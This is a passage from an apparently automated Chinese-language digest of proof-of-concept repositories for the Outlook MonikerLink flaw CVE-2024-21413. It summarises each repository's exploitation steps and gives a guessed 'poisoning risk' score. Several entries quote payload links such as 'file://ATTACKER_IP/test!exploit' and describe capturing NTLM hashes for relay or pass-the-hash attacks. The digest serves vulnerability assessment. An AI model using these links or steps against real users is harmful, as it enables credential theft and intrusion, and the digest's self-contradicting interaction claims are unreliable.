关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

